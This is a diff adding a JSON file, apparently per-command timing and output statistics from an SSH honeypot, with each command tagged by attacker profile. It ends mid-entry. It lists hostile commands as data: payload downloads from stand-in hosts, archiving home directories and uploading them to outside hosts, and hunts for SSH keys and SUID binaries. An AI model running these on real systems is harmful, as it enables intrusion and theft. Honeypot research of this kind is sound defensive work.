@@ -1,0 +1,1193 @@
+{
+  "arp -a": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      89
+    ],
+    "profiles": [
+      "lateral_movement"
+    ],
+    "example_output": "arp -a\n-bash: /usr/sbin/arp: cannot execute binary file: Exec format error\nroot@svr04:~# ",
+    "median_output_chars": 89,
+    "max_wait_s": 0.047
+  },
+  "cat /etc/apt/sources.list": {
+    "n": 2,
+    "prompt_returned": 2,
+    "recorded": 2,
+    "wait_s": [
+      0.062,
+      0.047
+    ],
+    "output_chars": [
+      42,
+      42
+    ],
+    "profiles": [
+      "benign_admin"
+    ],
+    "example_output": "cat /etc/apt/sources.list\nubuntu@svr04:~$ ",
+    "median_output_chars": 42.0,
+    "max_wait_s": 0.062
+  },
+  "cat /etc/crontab": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      31
+    ],
+    "profiles": [
+      "privilege_escalation"
+    ],
+    "example_output": "cat /etc/crontab\nuser@svr04:~$ ",
+    "median_output_chars": 31,
+    "max_wait_s": 0.047
+  },
+  "cat /etc/hosts": {
+    "n": 2,
+    "prompt_returned": 2,
+    "recorded": 2,
+    "wait_s": [
+      0.047,
+      0.047
+    ],
+    "output_chars": [
+      213,
+      219
+    ],
+    "profiles": [
+      "lateral_movement"
+    ],
+    "example_output": "cat /etc/hosts\n127.0.0.1\tlocalhost\n127.0.1.1\tnas3\n\n# The following lines are desirable for IPv6 capable hosts\n::1     localhost ip6-localhost ip6-loopback\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\nroot@svr04:~# ",
+    "median_output_chars": 216.0,
+    "max_wait_s": 0.047
+  },
+  "cat /etc/os-release": {
+    "n": 3,
+    "prompt_returned": 3,
+    "recorded": 3,
+    "wait_s": [
+      0.047,
+      0.047,
+      0.047
+    ],
+    "output_chars": [
+      35,
+      34,
+      35
+    ],
+    "profiles": [
+      "benign_admin",
+      "reconnaissance"
+    ],
+    "example_output": "cat /etc/os-release\nadmin@svr04:~$ ",
+    "median_output_chars": 35,
+    "max_wait_s": 0.047
+  },
+  "cat /etc/passwd": {
+    "n": 3,
+    "prompt_returned": 3,
+    "recorded": 3,
+    "wait_s": [
+      0.063,
+      0.047,
+      0.047
+    ],
+    "output_chars": [
+      898,
+      898,
+      899
+    ],
+    "profiles": [
+      "reconnaissance"
+    ],
+    "example_output": "cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mai",
+    "median_output_chars": 898,
+    "max_wait_s": 0.063
+  },
+  "cat /etc/sudoers": {
+    "n": 3,
+    "prompt_returned": 3,
+    "recorded": 3,
+    "wait_s": [
+      0.047,
+      0.047,
+      0.047
+    ],
+    "output_chars": [
+      80,
+      76,
+      80
+    ],
+    "profiles": [
+      "privilege_escalation"
+    ],
+    "example_output": "cat /etc/sudoers\ncat: /etc/sudoers: No such file or directory\nwww-data@svr04:/$ ",
+    "median_output_chars": 80,
+    "max_wait_s": 0.047
+  },
+  "cat /proc/cpuinfo": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.062
+    ],
+    "output_chars": [
+      1444
+    ],
+    "profiles": [
+      "botnet"
+    ],
+    "example_output": "cat /proc/cpuinfo\nprocessor\t: 0\nvendor_id\t: GenuineIntel\ncpu family\t: 6\nmodel\t\t: 23\nmodel name\t: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz\nstepping\t: 6\ncpu MHz\t\t: 2133.304\ncache size\t: 6144 KB\nphysical id\t: 0\nsiblings\t: 2\ncore id\t\t: 0\ncpu cores\t: 2\napicid\t\t: 0\ninitial apicid\t: 0\nfpu\t\t: yes\nfpu",
+    "median_output_chars": 1444,
+    "max_wait_s": 0.062
+  },
+  "cat /proc/version": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.046
+    ],
+    "output_chars": [
+      162
+    ],
+    "profiles": [
+      "reconnaissance"
+    ],
+    "example_output": "cat /proc/version\nLinux version 3.2.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 4.6.3 (Debian 4.6.3-14) ) #1 SMP Debian 3.2.68-1+deb7u1\nroot@svr04:~# ",
+    "median_output_chars": 162,
+    "max_wait_s": 0.046
+  },
+  "cat ~/.bash_history": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      82
+    ],
+    "profiles": [
+      "lateral_movement"
+    ],
+    "example_output": "cat ~/.bash_history\ncat: ~/.bash_history: No such file or directory\nroot@svr04:~# ",
+    "median_output_chars": 82,
+    "max_wait_s": 0.047
+  },
+  "cat ~/.ssh/config": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.063
+    ],
+    "output_chars": [
+      78
+    ],
+    "profiles": [
+      "lateral_movement"
+    ],
+    "example_output": "cat ~/.ssh/config\ncat: ~/.ssh/config: No such file or directory\nroot@svr04:~# ",
+    "median_output_chars": 78,
+    "max_wait_s": 0.063
+  },
+  "cat ~/.ssh/known_hosts": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      94
+    ],
+    "profiles": [
+      "lateral_movement"
+    ],
+    "example_output": "cat ~/.ssh/known_hosts\ncat: ~/.ssh/known_hosts: No such file or directory\nsvc_backup@svr04:~$ ",
+    "median_output_chars": 94,
+    "max_wait_s": 0.047
+  },
+  "cd /tmp || cd /var/tmp": {
+    "n": 2,
+    "prompt_returned": 2,
+    "recorded": 2,
+    "wait_s": [
+      0.047,
+      0.046
+    ],
+    "output_chars": [
+      45,
+      44
+    ],
+    "profiles": [
+      "botnet"
+    ],
+    "example_output": "cd /tmp || cd /var/tmp\nadmin@svr04:/var/tmp$ ",
+    "median_output_chars": 44.5,
+    "max_wait_s": 0.047
+  },
+  "cd /var/tmp": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      33
+    ],
+    "profiles": [
+      "botnet"
+    ],
+    "example_output": "cd /var/tmp\nroot@svr04:/var/tmp# ",
+    "median_output_chars": 33,
+    "max_wait_s": 0.047
+  },
+  "chmod +x payload": {
+    "n": 3,
+    "prompt_returned": 3,
+    "recorded": 3,
+    "wait_s": [
+      0.047,
+      0.046,
+      0.047
+    ],
+    "output_chars": [
+      97,
+      96,
+      96
+    ],
+    "profiles": [
+      "botnet"
+    ],
+    "example_output": "chmod +x payload\nchmod: cannot access 'payload': No such file or directory\nadmin@svr04:/var/tmp$ ",
+    "median_output_chars": 96,
+    "max_wait_s": 0.047
+  },
+  "clear": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      23
+    ],
+    "profiles": [
+      "benign_admin"
+    ],
+    "example_output": "clear\n\u001bcadmin@svr04:~$ ",
+    "median_output_chars": 23,
+    "max_wait_s": 0.047
+  },
+  "curl -I http://files.example/": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.063
+    ],
+    "output_chars": [
+      93
+    ],
+    "profiles": [
+      "benign_admin"
+    ],
+    "example_output": "curl -I http://files.example/\ncurl: (6) Could not resolve host: files.example\nadmin@svr04:~$ ",
+    "median_output_chars": 93,
+    "max_wait_s": 0.063
+  },
+  "curl -T /tmp/d.tgz http://198.51.100.20/u": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      153
+    ],
+    "profiles": [
+      "data_exfiltration"
+    ],
+    "example_output": "curl -T /tmp/d.tgz http://198.51.100.20/u\ncurl: option -T not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\nbackup@svr04:~$ ",
+    "median_output_chars": 153,
+    "max_wait_s": 0.047
+  },
+  "curl -T /var/tmp/d.tgz http://mirror.example/u": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.063
+    ],
+    "output_chars": [
+      158
+    ],
+    "profiles": [
+      "data_exfiltration"
+    ],
+    "example_output": "curl -T /var/tmp/d.tgz http://mirror.example/u\ncurl: option -T not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\nbackup@svr04:~$ ",
+    "median_output_chars": 158,
+    "max_wait_s": 0.063
+  },
+  "curl -T /var/tmp/d.tgz http://pkg-repo.example/u": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      158
+    ],
+    "profiles": [
+      "data_exfiltration"
+    ],
+    "example_output": "curl -T /var/tmp/d.tgz http://pkg-repo.example/u\ncurl: option -T not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\nroot@svr04:~# ",
+    "median_output_chars": 158,
+    "max_wait_s": 0.047
+  },
+  "curl -s http://pkg-repo.example/ip": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      101
+    ],
+    "profiles": [
+      "reconnaissance"
+    ],
+    "example_output": "curl -s http://pkg-repo.example/ip\ncurl: (6) Could not resolve host: pkg-repo.example\nadmin@svr04:~$ ",
+    "median_output_chars": 101,
+    "max_wait_s": 0.047
+  },
+  "date": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      50
+    ],
+    "profiles": [
+      "benign_admin"
+    ],
+    "example_output": "date\nTue Nov 10 12:11:41 UTC 2026\nubuntu@svr04:~$ ",
+    "median_output_chars": 50,
+    "max_wait_s": 0.047
+  },
+  "df -h": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      611
+    ],
+    "profiles": [
+      "reconnaissance"
+    ],
+    "example_output": "df -h\nFilesystem                                              Size  Used Avail Use% Mounted on\nrootfs                                                  4.7G  731M  3.8G  17% /\nudev                                                     10M     0   10M   0% /dev\ntmpfs                                     ",
+    "median_output_chars": 611,
+    "max_wait_s": 0.047
+  },
+  "du -sh /home /var/www": {
+    "n": 2,
+    "prompt_returned": 2,
+    "recorded": 2,
+    "wait_s": [
+      0.047,
+      0.046
+    ],
+    "output_chars": [
+      48,
+      46
+    ],
+    "profiles": [
+      "data_exfiltration"
+    ],
+    "example_output": "du -sh /home /var/www\n28K     .\nbackup@svr04:~$ ",
+    "median_output_chars": 47.0,
+    "max_wait_s": 0.047
+  },
+  "du -sh /var/log": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      41
+    ],
+    "profiles": [
+      "benign_admin"
+    ],
+    "example_output": "du -sh /var/log\n28K     .\nadmin@svr04:~$ ",
+    "median_output_chars": 41,
+    "max_wait_s": 0.047
+  },
+  "enable": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.063
+    ],
+    "output_chars": [
+      771
+    ],
+    "profiles": [
+      "botnet"
+    ],
+    "example_output": "enable\nenable .\nenable :\nenable [\nenable alias\nenable bg\nenable bind\nenable break\nenable builtin\nenable caller\nenable cd\nenable command\nenable compgen\nenable complete\nenable continue\nenable declare\nenable dirs\nenable disown\nenable echo\nenable enable\nenable eval\nenable exec\nenable exit\nenable export\n",
+    "median_output_chars": 771,
+    "max_wait_s": 0.063
+  },
+  "find / -name id_rsa 2>/dev/null": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      11.656
+    ],
+    "output_chars": [
+      46
+    ],
+    "profiles": [
+      "privilege_escalation"
+    ],
+    "example_output": "find / -name id_rsa 2>/dev/null\nuser@svr04:~$ ",
+    "median_output_chars": 46,
+    "max_wait_s": 11.656
+  },
+  "find / -perm -4000 -type f 2>/dev/null": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      57
+    ],
+    "profiles": [
+      "privilege_escalation"
+    ],
+    "example_output": "find / -perm -4000 -type f 2>/dev/null\nwww-data@svr04:/$ ",
+    "median_output_chars": 57,
+    "max_wait_s": 0.047
+  },
+  "find / -perm -u=s -type f 2>/dev/null": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      56
+    ],
+    "profiles": [
+      "privilege_escalation"
+    ],
+    "example_output": "find / -perm -u=s -type f 2>/dev/null\nwww-data@svr04:/$ ",
+    "median_output_chars": 56,
+    "max_wait_s": 0.047
+  },
+  "find /home -name '*.db' 2>/dev/null": {
+    "n": 2,
+    "prompt_returned": 2,
+    "recorded": 2,
+    "wait_s": [
+      0.047,
+      0.062
+    ],
+    "output_chars": [
+      52,
+      50
+    ],
+    "profiles": [
+      "data_exfiltration"
+    ],
+    "example_output": "find /home -name '*.db' 2>/dev/null\nbackup@svr04:~$ ",
+    "median_output_chars": 51.0,
+    "max_wait_s": 0.062
+  },
+  "free -m": {
+    "n": 2,
+    "prompt_returned": 2,
+    "recorded": 2,
+    "wait_s": [
+      0.062,
+      0.047
+    ],
+    "output_chars": [
+      228,
+      228
+    ],
+    "profiles": [
+      "benign_admin"
+    ],
+    "example_output": "free -m\n              total        used        free      shared  buff/cache   available\nMem:           7950        1040        4188           5        2720        6792\nSwap:          2097           0        2097\nubuntu@svr04:~$ ",
+    "median_output_chars": 228.0,
+    "max_wait_s": 0.062
+  },
+  "groups": {
+    "n": 3,
+    "prompt_returned": 3,
+    "recorded": 3,
+    "wait_s": [
+      0.047,
+      0.047,
+      0.063
+    ],
+    "output_chars": [
+      27,
+      35,
+      35
+    ],
+    "profiles": [
+      "privilege_escalation",
+      "reconnaissance"
+    ],
+    "example_output": "groups\nroot \nroot@svr04:~# ",
+    "median_output_chars": 35,
+    "max_wait_s": 0.063
+  },
+  "hostname": {
+    "n": 2,
+    "prompt_returned": 2,
+    "recorded": 2,
+    "wait_s": [
+      0.062,
+      0.047
+    ],
+    "output_chars": [
+      29,
+      29
+    ],
+    "profiles": [
+      "lateral_movement",
+      "reconnaissance"
+    ],
+    "example_output": "hostname\nsvr04\nuser@svr04:~$ ",
+    "median_output_chars": 29.0,
+    "max_wait_s": 0.062
+  },
+  "id": {
+    "n": 5,
+    "prompt_returned": 5,
+    "recorded": 5,
+    "wait_s": [
+      0.063,
+      0.047,
+      0.063,
+      0.047,
+      0.046
+    ],
+    "output_chars": [
+      73,
+      73,
+      73,
+      56,
+      56
+    ],
+    "profiles": [
+      "benign_admin",
+      "botnet"
+    ],
+    "example_output": "id\nuid=8639(ubuntu) gid=8639(ubuntu) groups=8639(ubuntu)\nubuntu@svr04:~$ ",
+    "median_output_chars": 73,
+    "max_wait_s": 0.063
+  },
+  "ip a": {
+    "n": 2,
+    "prompt_returned": 2,
+    "recorded": 2,
+    "wait_s": [
+      0.047,
+      0.062
+    ],
+    "output_chars": [
+      82,
+      82
+    ],
+    "profiles": [
+      "reconnaissance"
+    ],
+    "example_output": "ip a\n-bash: /sbin/ip: cannot execute binary file: Exec format error\nroot@svr04:~# ",
+    "median_output_chars": 82.0,
+    "max_wait_s": 0.062
+  },
+  "ls -la": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      328
+    ],
+    "profiles": [
+      "reconnaissance"
+    ],
+    "example_output": "ls -la\ndrwx------ 1 root root 4096 2013-04-05 12:25 .\ndrwxr-xr-x 1 root root 4096 2013-04-05 12:03 ..\ndrwx------ 1 root root 4096 2013-04-05 11:58 .aptitude\n-rw-r--r-- 1 root root  570 2013-04-05 11:52 .bashrc\n-rw-r--r-- 1 root root  140 2013-04-05 11:52 .profile\ndrwx------ 1 root root 4096 2013-04-",
+    "median_output_chars": 328,
+    "max_wait_s": 0.047
+  },
+  "ls -la /etc/passwd": {
+    "n": 2,
+    "prompt_returned": 2,
+    "recorded": 2,
+    "wait_s": [
+      0.047,
+      0.047
+    ],
+    "output_chars": [
+      93,
+      89
+    ],
+    "profiles": [
+      "privilege_escalation"
+    ],
+    "example_output": "ls -la /etc/passwd\n-rw-r--r-- 1 root root 872 2013-04-05 12:02 /etc/passwd\nwww-data@svr04:/$ ",
+    "median_output_chars": 91.0,
+    "max_wait_s": 0.047
+  },
+  "ls -la /etc/shadow": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.046
+    ],
+    "output_chars": [
+      95
+    ],
+    "profiles": [
+      "privilege_escalation"
+    ],
+    "example_output": "ls -la /etc/shadow\n-rw-r----- 1 root shadow 753 2013-04-05 12:02 /etc/shadow\nwww-data@svr04:/$ ",
+    "median_output_chars": 95,
+    "max_wait_s": 0.046
+  },
+  "ls -la /home": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.046
+    ],
+    "output_chars": [
+      174
+    ],
+    "profiles": [
+      "data_exfiltration"
+    ],
+    "example_output": "ls -la /home\ndrwxr-xr-x 1 root root 4096 2013-04-05 12:02 .\ndrwxr-xr-x 1 root root 4096 2013-04-05 12:03 ..\ndrwxr-xr-x 1 phil phil 4096 2013-04-05 12:02 phil\nbackup@svr04:~$ ",
+    "median_output_chars": 174,
+    "max_wait_s": 0.046
+  },
+  "ls -la /root/.ssh": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      188
+    ],
+    "profiles": [
+      "privilege_escalation"
+    ],
+    "example_output": "ls -la /root/.ssh\ndrwx------ 1 root root 4096 2013-04-05 12:05 .\ndrwx------ 1 root root 4096 2013-04-05 12:25 ..\n-rw-r--r-- 1 root root  442 2013-04-05 12:05 known_hosts\nwww-data@svr04:/$ ",
+    "median_output_chars": 188,
+    "max_wait_s": 0.047
+  },
+  "ls -la /var/backups": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      131
+    ],
+    "profiles": [
+      "data_exfiltration"
+    ],
+    "example_output": "ls -la /var/backups\ndrwxr-xr-x 1 root root 4096 2013-04-05 11:52 .\ndrwxr-xr-x 1 root root 4096 2013-04-05 11:52 ..\nbackup@svr04:~$ ",
+    "median_output_chars": 131,
+    "max_wait_s": 0.047
+  },
+  "ls -la /var/log | tail -n 5": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      313
+    ],
+    "profiles": [
+      "benign_admin"
+    ],
+    "example_output": "ls -la /var/log | tail -n 5\n-rw-r----- 1 root adm   25170 2013-04-05 12:03 messages\ndrwxr-xr-x 1 root root   4096 2013-04-05 12:03 news\n-rw-r----- 1 root adm   34832 2013-04-05 12:03 syslog\n-rw-r----- 1 root adm       0 2013-04-05 12:03 user.log\n-rw-rw-r-- 1 root utmp   6912 2013-04-05 12:03 wtmp\nad",
+    "median_output_chars": 313,
+    "max_wait_s": 0.047
+  },
+  "ls -la ~/.ssh": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      180
+    ],
+    "profiles": [
+      "lateral_movement"
+    ],
+    "example_output": "ls -la ~/.ssh\ndrwx------ 1 root root 4096 2013-04-05 12:05 .\ndrwx------ 1 root root 4096 2013-04-05 12:25 ..\n-rw-r--r-- 1 root root  442 2013-04-05 12:05 known_hosts\nroot@svr04:~# ",
+    "median_output_chars": 180,
+    "max_wait_s": 0.047
+  },
+  "nc -zv 192.0.2.5 22": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.046
+    ],
+    "output_chars": [
+      100
+    ],
+    "profiles": [
+      "lateral_movement"
+    ],
+    "example_output": "nc -zv 192.0.2.5 22\nnc: connect to 192.0.2.5 port 22 (tcp) failed: Connection refused\nroot@svr04:~# ",
+    "median_output_chars": 100,
+    "max_wait_s": 0.046
+  },
+  "netstat -antp": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      1905
+    ],
+    "profiles": [
+      "reconnaissance"
+    ],
+    "example_output": "netstat -antp\nActive Internet connections (w/o servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 *:ssh                   *:*                     LISTEN\ntcp        0    308 192.168.0.1:22          172.22.0.2:48370        ESTABLISHED\ntcp6       0   ",
+    "median_output_chars": 1905,
+    "max_wait_s": 0.047
+  },
+  "nmap -sn 192.0.2.0/24": {
+    "n": 3,
+    "prompt_returned": 3,
+    "recorded": 3,
+    "wait_s": [
+      0.046,
+      0.047,
+      0.063
+    ],
+    "output_chars": [
+      67,
+      67,
+      73
+    ],
+    "profiles": [
+      "lateral_movement"
+    ],
+    "example_output": "nmap -sn 192.0.2.0/24\n-bash: nmap: command not found\nroot@svr04:~# ",
+    "median_output_chars": 67,
+    "max_wait_s": 0.063
+  },
+  "ping -c 2 192.0.2.12": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      82
+    ],
+    "profiles": [
+      "lateral_movement"
+    ],
+    "example_output": "ping -c 2 192.0.2.12\nping: bad number of packets to transmit.\nsvc_backup@svr04:~$ ",
+    "median_output_chars": 82,
+    "max_wait_s": 0.047
+  },
+  "pwd": {
+    "n": 7,
+    "prompt_returned": 7,
+    "recorded": 7,
+    "wait_s": [
+      0.047,
+      0.046,
+      0.062,
+      0.063,
+      0.047,
+      0.047,
+      0.047
+    ],
+    "output_chars": [
+      24,
+      31,
+      31,
+      24,
+      24,
+      24,
+      24
+    ],
+    "profiles": [
+      "privilege_escalation",
+      "reconnaissance"
+    ],
+    "example_output": "pwd\n/root\nroot@svr04:~# ",
+    "median_output_chars": 24,
+    "max_wait_s": 0.063
+  },
+  "rm payload": {
+    "n": 2,
+    "prompt_returned": 2,
+    "recorded": 2,
+    "wait_s": [
+      0.046,
+      0.047
+    ],
+    "output_chars": [
+      88,
+      87
+    ],
+    "profiles": [
+      "botnet"
+    ],
+    "example_output": "rm payload\nrm: cannot remove `payload': No such file or directory\nadmin@svr04:/var/tmp$ ",
+    "median_output_chars": 87.5,
+    "max_wait_s": 0.047
+  },
+  "sh payload": {
+    "n": 3,
+    "prompt_returned": 3,
+    "recorded": 3,
+    "wait_s": [
+      0.047,
+      0.046,
+      0.047
+    ],
+    "output_chars": [
+      74,
+      73,
+      73
+    ],
+    "profiles": [
+      "botnet"
+    ],
+    "example_output": "sh payload\nbash: payload: No such file or directory\nadmin@svr04:/var/tmp$ ",
+    "median_output_chars": 73,
+    "max_wait_s": 0.047
+  },
+  "systemctl status ssh": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      73
+    ],
+    "profiles": [
+      "benign_admin"
+    ],
+    "example_output": "systemctl status ssh\n-bash: systemctl: command not found\nubuntu@svr04:~$ ",
+    "median_output_chars": 73,
+    "max_wait_s": 0.047
+  },
+  "tar cf /tmp/d.tar /var/www": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.063
+    ],
+    "output_chars": [
+      216
+    ],
+    "profiles": [
+      "data_exfiltration"
+    ],
+    "example_output": "tar cf /tmp/d.tar /var/www\ntar: /tmp/d.tar: Cannot open: No such file or directory\ntar: Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error exit delayed from previous errors\nbackup@svr04:~$ ",
+    "median_output_chars": 216,
+    "max_wait_s": 0.063
+  },
+  "tar czf /var/tmp/d.tgz /home": {
+    "n": 2,
+    "prompt_returned": 2,
+    "recorded": 2,
+    "wait_s": [
+      0.047,
+      0.063
+    ],
+    "output_chars": [
+      222,
+      220
+    ],
+    "profiles": [
+      "data_exfiltration"
+    ],
+    "example_output": "tar czf /var/tmp/d.tgz /home\ntar: /var/tmp/d.tgz: Cannot open: No such file or directory\ntar: Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error exit delayed from previous errors\nbackup@svr04:~$ ",
+    "median_output_chars": 221.0,
+    "max_wait_s": 0.063
+  },
+  "uname -a": {
+    "n": 3,
+    "prompt_returned": 3,
+    "recorded": 3,
+    "wait_s": [
+      0.047,
+      0.047,
+      0.063
+    ],
+    "output_chars": [
+      98,
+      96,
+      96
+    ],
+    "profiles": [
+      "botnet",
+      "brute_force"
+    ],
+    "example_output": "uname -a\nLinux svr04 3.2.0-4-amd64 #1 SMP Debian 3.2.68-1+deb7u1 x86_64 GNU/Linux\noracle@svr04:~$ ",
+    "median_output_chars": 96,
+    "max_wait_s": 0.063
+  },
+  "uname -m": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.046
+    ],
+    "output_chars": [
+      31
+    ],
+    "profiles": [
+      "botnet"
+    ],
+    "example_output": "uname -m\nx86_64\nadmin@svr04:~$ ",
+    "median_output_chars": 31,
+    "max_wait_s": 0.046
+  },
+  "uname -r": {
+    "n": 4,
+    "prompt_returned": 4,
+    "recorded": 4,
+    "wait_s": [
+      0.047,
+      0.047,
+      0.047,
+      0.047
+    ],
+    "output_chars": [
+      39,
+      37,
+      38,
+      37
+    ],
+    "profiles": [
+      "benign_admin",
+      "privilege_escalation",
+      "reconnaissance"
+    ],
+    "example_output": "uname -r\n3.2.0-4-amd64\nubuntu@svr04:~$ ",
+    "median_output_chars": 37.5,
+    "max_wait_s": 0.047
+  },
+  "w": {
+    "n": 4,
+    "prompt_returned": 4,
+    "recorded": 4,
+    "wait_s": [
+      0.047,
+      0.047,
+      0.047,
+      0.063
+    ],
+    "output_chars": [
+      214,
+      213,
+      214,
+      213
+    ],
+    "profiles": [
+      "benign_admin",
+      "lateral_movement",
+      "reconnaissance"
+    ],
+    "example_output": "w\n 12:11:22 up  3:07,  1 user,  load average: 0.00, 0.00, 0.00\nUSER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT\nadmin    pts/0    172.22.0.2        12:11    0.00s  0.00s  0.00s w\nadmin@svr04:~$ ",
+    "median_output_chars": 213.5,
+    "max_wait_s": 0.063
+  },
+  "wget -q http://files.example/payload -O payload": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      122
+    ],
+    "profiles": [
+      "botnet"
+    ],
+    "example_output": "wget -q http://files.example/payload -O payload\nwget: unable to resolve host address \u2018files.example\u2019\nroot@svr04:/var/tmp# ",
+    "median_output_chars": 122,
+    "max_wait_s": 0.047
+  },
+  "wget -q http://pkg-repo.example/payload -O payload": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      128
+    ],
+    "profiles": [
+      "botnet"
+    ],
+    "example_output": "wget -q http://pkg-repo.example/payload -O payload\nwget: unable to resolve host address \u2018pkg-repo.example\u2019\nroot@svr04:/var/tmp# ",
+    "median_output_chars": 128,
+    "max_wait_s": 0.047
+  },
+  "wget -qO- http://mirror.example/ip": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      103
+    ],
+    "profiles": [
+      "reconnaissance"
+    ],
+    "example_output": "wget -qO- http://mirror.example/ip\nwget: unable to resolve host address \u2018mirror.example\u2019\nuser@svr04:~$ ",
+    "median_output_chars": 103,
+    "max_wait_s": 0.047
+  },
+  "wget -qO- http://pkg-repo.example/ip": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.047
+    ],
+    "output_chars": [
+      107
+    ],
+    "profiles": [
+      "reconnaissance"
+    ],
+    "example_output": "wget -qO- http://pkg-repo.example/ip\nwget: unable to resolve host address \u2018pkg-repo.example\u2019\nroot@svr04:~# ",
+    "median_output_chars": 107,
+    "max_wait_s": 0.047
+  },
+  "wget http://files.example/payload": {
+    "n": 1,
+    "prompt_returned": 1,
+    "recorded": 1,
+    "wait_s": [
+      0.046
+    ],
+    "output_chars": [
+      252
+    ],
+    "profiles": [
+      "botnet"
+    ],
+    "example_output": "wget http://files.example/payload\n--2026-11-10 12:13:32--  http://files.example/payload\nResolving files.example (files.example)... failed: Temporary failure in name resolution.\nwget: unable to resolve host address \u2018files.example\u2019\nadmin@svr04:/var/tmp$ ",
+    "median_output_chars": 252,
+    "max_wait_s": 0.046
+  },
+  "who": {
+    "n": 2,
+    "prompt_returned": 2,
+    "recorded": 2,
+    "wait_s": [
+      0.047,
+      0.047
+    ],
+    "output_chars": [
+      72,
+      72
+    ],
+    "profiles": [
+      "benign_admin"
+    ],
+    "example_output": "who\nubuntu   pts/0        2026-11-10 12:11 (172.22.0.2)\nubuntu@svr04:~$ ",
+    "median_output_chars": 72.0,
+    "max_wait_s": 0.047
+  },
+  "whoami": {
